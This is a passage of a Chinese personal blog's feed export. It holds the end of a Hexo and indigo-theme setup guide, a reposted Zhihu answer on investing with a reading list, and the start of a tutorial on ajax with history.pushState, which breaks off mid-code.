&lt;h3 id=&quot;主题安装&quot;&gt;&lt;a href=&quot;#主题安装&quot; class=&quot;headerlink&quot; title=&quot;主题安装&quot;&gt;&lt;/a&gt;主题安装&lt;/h3&gt;&lt;p&gt;安装需确认你的 Hexo 版本在 3.0 以上，在 Hexo 根目录，执行以下命令。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ git clone git@github.com:yscoder/hexo-theme-indigo.git themes/indigo&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;依赖安装&quot;&gt;&lt;a href=&quot;#依赖安装&quot; class=&quot;headerlink&quot; title=&quot;依赖安装&quot;&gt;&lt;/a&gt;依赖安装&lt;/h3&gt;&lt;p&gt;还是在 Hexo 根目录，如果以下插件已安装过，无需再次安装。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;安装-less&quot;&gt;&lt;a href=&quot;#安装-less&quot; class=&quot;headerlink&quot; title=&quot;安装 less&quot;&gt;&lt;/a&gt;安装 less&lt;/h4&gt;&lt;/blockquote&gt;
&lt;p&gt;主题默认使用 less 作为 css 预处理工具。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ npm install hexo-renderer-less --save&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;安装-feed&quot;&gt;&lt;a href=&quot;#安装-feed&quot; class=&quot;headerlink&quot; title=&quot;安装 feed&quot;&gt;&lt;/a&gt;安装 feed&lt;/h4&gt;&lt;/blockquote&gt;
&lt;p&gt;用于生成 rss。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ npm install hexo-generator-feed --save&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;安装-json-content&quot;&gt;&lt;a href=&quot;#安装-json-content&quot; class=&quot;headerlink&quot; title=&quot;安装 json-content&quot;&gt;&lt;/a&gt;安装 json-content&lt;/h4&gt;&lt;/blockquote&gt;
&lt;p&gt;用于生成静态站点数据，用作站内搜索的数据源。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ npm install hexo-generator-json-content --save&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;开启标签页&quot;&gt;&lt;a href=&quot;#开启标签页&quot; class=&quot;headerlink&quot; title=&quot;开启标签页&quot;&gt;&lt;/a&gt;开启标签页&lt;/h4&gt;&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo new page tags&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修改 hexo/source/tags/index.md 的元数据&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;layout: tags
noDate: true
comments: false
---
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改主题文件夹下的配置文件 _config.yml&lt;/p&gt;
&lt;p&gt;每次部署都可按以下步骤来进行。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo clean&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ hexo generate -d&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;md文件正文中如果有双花括号，花括号之间加个空格，否则会被转义，不能正常显示。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;hexo默认会处理全部markdown和html文件，如果不想让hexo处理你的文件，可以在文件头中加入layout: false。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;hexo中所有文件的编码格式均是UTF-8&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;引用的文章地址&quot;&gt;&lt;a href=&quot;#引用的文章地址&quot; class=&quot;headerlink&quot; title=&quot;引用的文章地址&quot;&gt;&lt;/a&gt;引用的文章地址&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Git教程&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.jianshu.com/p/465830080ea9&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HEXO+Github,搭建属于自己的博客&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://hexo.io/zh-cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo官网&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/yscoder/hexo-theme-indigo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;indigo主题&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.tuicool.com/articles/AfQnQjy/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;hexo你的博客&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;咋也准备跟着潮流，使用Hexo在github上搭建一个免费的静态博客。以下就是我自己在搭建网站过程中记录的内容。&lt;/p&gt;
&lt;h2 id=&quot;前提条件&quot;&gt;&lt;a href=&quot;#前提条件&quot; class=&quot;headerlink&quot; title=&quot;前提条件&quot;&gt;&lt;/a&gt;前提条件&lt;/h2&gt;&lt;h3 id=&quot;1、NodeJs&quot;&gt;&lt;a href=&quot;#1、NodeJs&quot; class=&quot;headerlink&quot; title=&quot;1、NodeJs&quot;&gt;&lt;/a&gt;1、NodeJs&lt;/h3&gt;&lt;p&gt;到&lt;a href=&quot;https://nodejs.org&quot;&gt;NodeJs官网&lt;/a&gt;下载对应平台的最新版本。安装结束后，在cmd控制台输入：&lt;code&gt;node -v&lt;/code&gt;,出现版本提示表示安装成功。&lt;br&gt;
    
    </summary>
    
    
      <category term="Web开发" scheme="http://qrframe.com/tags/Web%E5%BC%80%E5%8F%91/"/>
    
      <category term="个人网站" scheme="http://qrframe.com/tags/%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>普通人如何合理的理财投资，有哪些书可以学习阅读？</title>
    <link href="http://qrframe.com/2016/07/12/%E6%99%AE%E9%80%9A%E4%BA%BA%E5%A6%82%E4%BD%95%E5%90%88%E7%90%86%E7%9A%84%E7%90%86%E8%B4%A2%E6%8A%95%E8%B5%84%EF%BC%8C%E6%9C%89%E5%93%AA%E4%BA%9B%E4%B9%A6%E5%8F%AF%E4%BB%A5%E5%AD%A6%E4%B9%A0%E9%98%85%E8%AF%BB%EF%BC%9F/"/>
    <id>http://qrframe.com/2016/07/12/普通人如何合理的理财投资，有哪些书可以学习阅读？/</id>
    <published>2016-07-12T02:54:04.000Z</published>
    <updated>2016-07-13T06:51:11.679Z</updated>
    
    <content type="html">&lt;h2 id=&quot;1、时刻记住，风险和收益成正比&quot;&gt;&lt;a href=&quot;#1、时刻记住，风险和收益成正比&quot; class=&quot;headerlink&quot; title=&quot;1、时刻记住，风险和收益成正比&quot;&gt;&lt;/a&gt;1、时刻记住，风险和收益成正比&lt;/h2&gt;&lt;p&gt;如果说理财投资是一个游戏的话，那么这个游戏当中有一些基本的规则。 最重要的一条，也是最容易被忽略的一条就是：&lt;br&gt;收益和风险成正比。 大部分人眼里只看得到收益，而且是越高越好，很容易忘记风险。在理财投资当中，利用杠杆和一时运气，是有可能达到100%，甚至更高的收益率，请看这位楼主和一楼（&lt;a href=&quot;http://www.zhihu.com/question/22683998&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;一年投资稳定 100 万还有必要工作吗？&lt;/a&gt;）但是不要忘记，风险也同比增长。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;以下是各类投资的常规收益率（美国数据）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;银行存款2.5%&lt;/li&gt;
&lt;li&gt;1年期国债3%（基准利率）&lt;/li&gt;
&lt;li&gt;5年期国债4%&lt;/li&gt;
&lt;li&gt;10年期国债5%&lt;/li&gt;
&lt;li&gt;抵押公司债6%&lt;/li&gt;
&lt;li&gt;标普指数7%&lt;/li&gt;
&lt;li&gt;无抵押高收益公司债8%&lt;/li&gt;
&lt;li&gt;小盘股12%&lt;/li&gt;
&lt;li&gt;房地产15%&lt;/li&gt;
&lt;li&gt;风投25% 。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;这几个数字是常识，请牢牢记得。一般来说，这些投资对象的收益率会在这个附近波动，小幅波动，可能是机遇，但如果过分大的背离这个数值，就很可能是骗局。&lt;/p&gt;
&lt;h2 id=&quot;2、知其然，还要知其所以然。&quot;&gt;&lt;a href=&quot;#2、知其然，还要知其所以然。&quot; class=&quot;headerlink&quot; title=&quot;2、知其然，还要知其所以然。&quot;&gt;&lt;/a&gt;2、知其然，还要知其所以然。&lt;/h2&gt;&lt;p&gt;其实在刚开始资金量小的时候，不用太在意输赢，应该在意的是“为什么输”“为什么赢”。如果说投资跟做科学实验有什么相同的话，那就是“实验结果可重复显现”。&lt;br&gt;举例来说：在真空条件下， 羽毛和铅球从高处往下扔，应该是同时落地的。这是自由落体运动。 只要满足在真空这个条件， 无论你在哪个地方扔，扔1次还是500次，结果都应该是一样的。&lt;br&gt;所以，如果你今天穿红袜子，你买的股票涨停了。然后你得出结论说，只要穿红袜子，买股票就会涨停。 大家不要笑，这种例子实际很多。&lt;br&gt;所以当你赢的时候，你要知道是什么原因让你赢，而且要反复检验这种“赢”是否是符合逻辑的，是否可重复。 当然，你“输”的时候，也不要过分沮丧，更不要把原因归结为“中国是政策市，没法投资”之类。&lt;br&gt;实际上，投资理财并不像专家们鼓吹得那么难，保持合理的心态，寻找合理的逻辑，学习相关的知识，你是有可能会比身边的人赢得更高的收益率的。投资是一种技能，跟学习英语没什么两样，只要有正确的方法，持续的练习，总是会看到效果的。&lt;/p&gt;
&lt;p&gt;以下是书单部分，评语是我先生加的。&lt;/p&gt;
&lt;h3 id=&quot;聪明的投资者-五星&quot;&gt;&lt;a href=&quot;#聪明的投资者-五星&quot; class=&quot;headerlink&quot; title=&quot;聪明的投资者 五星&quot;&gt;&lt;/a&gt;聪明的投资者 五星&lt;/h3&gt;&lt;p&gt;我大概看了五六遍吧，每一次都有新的体会。这本书是巴菲特的老师格雷厄姆的心血之作，包含了格雷厄姆价值投资的精髓，也包含了小熊最喜欢的量化的精髓。当中还有个插曲，当时小熊和水湄新婚旅行去尼泊尔，把这本书落在尼泊尔的长途车上了。回来心痛不已，马上重新买一本。&lt;/p&gt;
&lt;h3 id=&quot;巴菲特致股东的信：股份公司教程-五星&quot;&gt;&lt;a href=&quot;#巴菲特致股东的信：股份公司教程-五星&quot; class=&quot;headerlink&quot; title=&quot;巴菲特致股东的信：股份公司教程 五星&quot;&gt;&lt;/a&gt;巴菲特致股东的信：股份公司教程 五星&lt;/h3&gt;&lt;p&gt;这本书其实才是巴菲特投资思想的精髓，当中很多的段落都值得我们反复的思考。建议看上十遍以上。&lt;/p&gt;
&lt;h3 id=&quot;安全边际-五星&quot;&gt;&lt;a href=&quot;#安全边际-五星&quot; class=&quot;headerlink&quot; title=&quot;安全边际 五星&quot;&gt;&lt;/a&gt;安全边际 五星&lt;/h3&gt;&lt;p&gt;小熊最喜欢的两个投资者之一，塞斯卡拉曼的唯一一本书。这本书，第一次看小熊觉得很平淡嘛，没什么稀奇的。但是以后每一次重看都有更深的体会。在ebay上，这本书的签名版被炒到了1000美金一本。&lt;/p&gt;
&lt;h3 id=&quot;你能成为股市天才-五星&quot;&gt;&lt;a href=&quot;#你能成为股市天才-五星&quot; class=&quot;headerlink&quot; title=&quot;你能成为股市天才 五星&quot;&gt;&lt;/a&gt;你能成为股市天才 五星&lt;/h3&gt;&lt;p&gt;这 本书，恐怕是小熊看的最多遍的书了，我一直放在床头反复的看。当中的充满了乔尔格林布拉特公司分析的精髓。根据里面教授的投资，小熊这两年也在慢慢拓展自 己的能力圈。说实话，比起巴菲特，乔尔是很愿意和大家分享自己的投资分析和心得的人。这点也感染了小熊，多多和大家分享自己的投资技巧心得。&lt;/p&gt;
&lt;h3 id=&quot;伟大的博弈-四星半&quot;&gt;&lt;a href=&quot;#伟大的博弈-四星半&quot; class=&quot;headerlink&quot; title=&quot;伟大的博弈 四星半&quot;&gt;&lt;/a&gt;伟大的博弈 四星半&lt;/h3&gt;&lt;p&gt;不 知道有多少人学习投资，或者学习价值投资开手的书竟然是这本。当时选这书作为第一本道理很简单，这本是我第一本找到和下载的，而且书的内容通俗易懂，就 是讲故事。但是这个无心之举，反而受到了奇效。就像是杨威利元帅学习军事史成为一代名将一样，学习金融史，也能够帮助我蔑视一切市场反常的波动，不论多么 大的波动华尔街历史上都经历过了。那时恰逢2007年底到2008年，美国股市正好是自由落体下跌的时候，我心理承受能力倒是因为这本书好了很多。&lt;/p&gt;
&lt;h3 id=&quot;价值投资者文摘-四星半&quot;&gt;&lt;a href=&quot;#价值投资者文摘-四星半&quot; class=&quot;headerlink&quot; title=&quot;价值投资者文摘 四星半&quot;&gt;&lt;/a&gt;价值投资者文摘 四星半&lt;/h3&gt;&lt;p&gt;一 共厚厚五十本，放慢了我家书架的两层。当中的文章大多数都是从美国的《杰出投资者文摘》翻译过来的，都是很好的文章。有些乍一看和投资没有任何的关系，但 是增进眼界是投资的一大要素。而且常言道，功夫在诗外，不同的学科可以让我们有不同的感悟。当然，投资的基础教材还是首位的，因为就算功夫在诗外，那也得 先学好作诗了，然后在开发外面的功夫吧。&lt;/p&gt;
&lt;h3 id=&quot;股票投资大智慧-四星半&quot;&gt;&lt;a href=&quot;#股票投资大智慧-四星半&quot; class=&quot;headerlink&quot; title=&quot;股票投资大智慧 四星半&quot;&gt;&lt;/a&gt;股票投资大智慧 四星半&lt;/h3&gt;&lt;p&gt;这本书严格意义上讲，并不是投资书，但是他胜过大部分投资书。他讲述的是芒格的栅格思维方式，帮助我们锻炼我们思考各种问题，包括投资的能力。&lt;/p&gt;
&lt;h3 id=&quot;怎样选择成长股-四星&quot;&gt;&lt;a href=&quot;#怎样选择成长股-四星&quot; class=&quot;headerlink&quot; title=&quot;怎样选择成长股 四星&quot;&gt;&lt;/a&gt;怎样选择成长股 四星&lt;/h3&gt;&lt;p&gt;另一位大师费雪的名作，也是他唯一一本书。这本书最大的特色就是定性分析无敌，费雪的问题当然也在于这里，过分强调定性分析而忽视定量。当然书中介绍公司的定性分析方法还是很精彩的。&lt;/p&gt;
&lt;h3 id=&quot;约翰-聂夫谈投资-四星&quot;&gt;&lt;a href=&quot;#约翰-聂夫谈投资-四星&quot; class=&quot;headerlink&quot; title=&quot;约翰.聂夫谈投资 四星&quot;&gt;&lt;/a&gt;约翰.聂夫谈投资 四星&lt;/h3&gt;&lt;p&gt;这本书恐怕没多少人听说过，就像约翰聂夫没多少人知道一样。约翰聂夫是著名温莎基金的基金经理，他执掌温莎基金31年，22次跑赢市场，投资增长55倍，年平均收益率超过市场平均收益率达3％以上。他开创了低市盈率投资方法，是价值投资法的一种表现形式。&lt;/p&gt;
&lt;h3 id=&quot;邓普顿教你逆向投资-四星&quot;&gt;&lt;a href=&quot;#邓普顿教你逆向投资-四星&quot; class=&quot;headerlink&quot; title=&quot;邓普顿教你逆向投资 四星&quot;&gt;&lt;/a&gt;邓普顿教你逆向投资 四星&lt;/h3&gt;&lt;p&gt;美 国著名长寿投资者邓普顿的投资课，读起来生动有趣，又能给我们感悟。邓普顿爵士在价值投资的时候，价值投资这个词恐怕都没有发明了。但是这不妨碍他做投 资，邓普顿爵士本能的能够察觉到哪个公司，甚至是哪个国家被低估了。他的名言 – “买入最好的时机是在街头溅血的时候”，也是小熊最喜欢引用的。&lt;/p&gt;
&lt;h3 id=&quot;股市稳赚-四星&quot;&gt;&lt;a href=&quot;#股市稳赚-四星&quot; class=&quot;headerlink&quot; title=&quot;股市稳赚 四星&quot;&gt;&lt;/a&gt;股市稳赚 四星&lt;/h3&gt;&lt;p&gt;小 熊最喜欢的两个投资者之一，乔尔格林布拉特的投资教材，整本书更像一本故事书。但是因为乔尔想要让这本书连他的儿子女儿都能看懂，导致的问题就是过分简单 了，屏蔽了很多的细节，所以通俗有余而深刻不足。不过里面至少介绍了乔尔分析公司盈利的思路，小熊已经把它吸纳进我的投资体系中，也在进阶课第一课做了介 绍。&lt;/p&gt;
&lt;h3 id=&quot;赌金者-–-长期资本管理公司的陨落-四星&quot;&gt;&lt;a href=&quot;#赌金者-–-长期资本管理公司的陨落-四星&quot; class=&quot;headerlink&quot; title=&quot;赌金者 – 长期资本管理公司的陨落 四星&quot;&gt;&lt;/a&gt;赌金者 – 长期资本管理公司的陨落 四星&lt;/h3&gt;&lt;p&gt;这也是一本值得反复玩味的书，讲的是美国金融史上很著名的由两个诺贝尔经济学奖得主和几个数学教授组成的大型对冲基金，最后破灭的故事。比起他们来说，高盛操纵大宗商品市场和巴克莱操纵短期利率显得小儿科了很多。&lt;/p&gt;
&lt;h3 id=&quot;股市真规则-四星&quot;&gt;&lt;a href=&quot;#股市真规则-四星&quot; class=&quot;headerlink&quot; title=&quot;股市真规则 四星&quot;&gt;&lt;/a&gt;股市真规则 四星&lt;/h3&gt;&lt;p&gt;也是我一开始看的几本书之一。这本书最强的地方就是把几乎所有的行业都点评了一遍，每个行业注意的要点啊什么的。但是问题也是流于广而不精，这当然也是没办法的。看完这本书，你会觉得自己似乎每个行业都懂一点，但是真正要投资的时候，却又不懂了。&lt;/p&gt;
&lt;h3 id=&quot;巴菲特的护城河-四星&quot;&gt;&lt;a href=&quot;#巴菲特的护城河-四星&quot; class=&quot;headerlink&quot; title=&quot;巴菲特的护城河 四星&quot;&gt;&lt;/a&gt;巴菲特的护城河 四星&lt;/h3&gt;&lt;p&gt;晨星公司投资部主任写的书，详细分析了各种护城河的成因，判断方法，以及如何量化。小熊也将他纳入了自己的投资体系，初级课中的护城河理念就是从这里来的。&lt;/p&gt;
&lt;h3 id=&quot;芒格的各类演讲-四星&quot;&gt;&lt;a href=&quot;#芒格的各类演讲-四星&quot; class=&quot;headerlink&quot; title=&quot;芒格的各类演讲 四星&quot;&gt;&lt;/a&gt;芒格的各类演讲 四星&lt;/h3&gt;&lt;p&gt;芒格比起巴菲特更出世，所以他的演讲也更深奥一点。但是如果你能够耐心思考他所讲的内容的花，你将会发现芒格的思想是一整个体系，而投资只是当中一小块。&lt;/p&gt;
&lt;h3 id=&quot;魔球-四星&quot;&gt;&lt;a href=&quot;#魔球-四星&quot; class=&quot;headerlink&quot; title=&quot;魔球 四星&quot;&gt;&lt;/a&gt;魔球 四星&lt;/h3&gt;&lt;p&gt;这书也出电影了，布拉德皮特主演的，不过电影没书精彩。整本书讲述的就是，棒球界从定性分析到定量分析的一个过程，值得我们思考。&lt;/p&gt;
&lt;p&gt;作者：水湄物语&lt;br&gt;链接：&lt;a href=&quot;https://www.zhihu.com/question/22818974/answer/22745767&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.zhihu.com/question/22818974/answer/22745767&lt;/a&gt;&lt;br&gt;来源：知乎&lt;br&gt;著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、时刻记住，风险和收益成正比&quot;&gt;&lt;a href=&quot;#1、时刻记住，风险和收益成正比&quot; class=&quot;headerlink&quot; title=&quot;1、时刻记住，风险和收益成正比&quot;&gt;&lt;/a&gt;1、时刻记住，风险和收益成正比&lt;/h2&gt;&lt;p&gt;如果说理财投资是一个游戏的话，那么这个游戏当中有一些基本的规则。 最重要的一条，也是最容易被忽略的一条就是：&lt;br&gt;收益和风险成正比。 大部分人眼里只看得到收益，而且是越高越好，很容易忘记风险。在理财投资当中，利用杠杆和一时运气，是有可能达到100%，甚至更高的收益率，请看这位楼主和一楼（&lt;a href=&quot;http://www.zhihu.com/question/22683998&quot;&gt;一年投资稳定 100 万还有必要工作吗？&lt;/a&gt;）但是不要忘记，风险也同比增长。&lt;br&gt;
    
    </summary>
    
    
      <category term="投资理财" scheme="http://qrframe.com/tags/%E6%8A%95%E8%B5%84%E7%90%86%E8%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>ajax+history.pushState实现页面无刷新可回退效果</title>
    <link href="http://qrframe.com/2016/07/10/ajax-history-pushState%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%88%B7%E6%96%B0%E5%8F%AF%E5%9B%9E%E9%80%80%E6%95%88%E6%9E%9C/"/>
    <id>http://qrframe.com/2016/07/10/ajax-history-pushState实现页面无刷新可回退效果/</id>
    <published>2016-07-10T03:15:29.000Z</published>
    <updated>2016-07-13T06:51:20.618Z</updated>
    
    <content type="html">&lt;p&gt;Ajax可以实现页面的无刷新操作，但是，也会造成另外的问题，无法前进与后退。HTML5 history的新特性pushState、replaceState会帮我们实现页面的前进与后退。&lt;/p&gt;
&lt;p&gt;HTML5引入了histtory.pushState()和history.replaceState()这两个方法，他们允许添加和修改history实体。同时，这些方法会和window.onpostate事件一起工作。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;pushState用于向history添加当前页面的记录，而replaceState和pushState的用法完全一样，唯一的区别就是它用于修改当前页面在history中的记录。&lt;/p&gt;
&lt;h2 id=&quot;history-state&quot;&gt;&lt;a href=&quot;#history-state&quot; class=&quot;headerlink&quot; title=&quot;history.state&quot;&gt;&lt;/a&gt;history.state&lt;/h2&gt;&lt;p&gt;当前URL下对应的状态信息。如果当前URL不是通过pushState或者replaceState产生的，那么history.state是null。&lt;/p&gt;
&lt;h2 id=&quot;history-pushState-state-title-url&quot;&gt;&lt;a href=&quot;#history-pushState-state-title-url&quot; class=&quot;headerlink&quot; title=&quot;history.pushState(state, title, url)&quot;&gt;&lt;/a&gt;history.pushState(state, title, url)&lt;/h2&gt;&lt;p&gt;将当前URL和history.state加入到history中，并用新的state和URL替换当前。不会造成页面刷新。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;state：与要跳转到的URL对应的状态信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;title：不知道干啥用，传空字符串就行了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;url：要跳转到的URL地址，不能跨域&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;history-replaceState-state-title-url&quot;&gt;&lt;a href=&quot;#history-replaceState-state-title-url&quot; class=&quot;headerlink&quot; title=&quot;history.replaceState(state, title, url)&quot;&gt;&lt;/a&gt;history.replaceState(state, title, url)&lt;/h2&gt;&lt;p&gt;用新的state和URL替换当前。不会造成页面刷新。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;state：与要跳转到的URL对应的状态信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;title：不知道干啥用，传空字符串就行了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;url：要跳转到的URL地址，不能跨域&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;window-onpopstate&quot;&gt;&lt;a href=&quot;#window-onpopstate&quot; class=&quot;headerlink&quot; title=&quot;window.onpopstate&quot;&gt;&lt;/a&gt;window.onpopstate&lt;/h2&gt;&lt;p&gt;history.go和history.back（包括用户按浏览器历史前进后退按钮）触发，并且页面无刷的时候（由于使用pushState修改了history）会触发popstate事件，事件发生时浏览器会从history中取出URL和对应的state对象替换当前的URL和history.state。通过event.state也可以获取history.state。&lt;/p&gt;
&lt;h2 id=&quot;支持性判断&quot;&gt;&lt;a href=&quot;#支持性判断&quot; class=&quot;headerlink&quot; title=&quot;支持性判断&quot;&gt;&lt;/a&gt;支持性判断&lt;/h2&gt;&lt;p&gt;if (‘pushState’ in history) {…}&lt;/p&gt;
&lt;h2 id=&quot;示例代码&quot;&gt;&lt;a href=&quot;#示例代码&quot; class=&quot;headerlink&quot; title=&quot;示例代码&quot;&gt;&lt;/a&gt;示例代码&lt;/h2&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;row&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;col s12&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;ul&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;tabs&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;tab col s3&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;active&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;test?id=test1&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;Test 1&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span 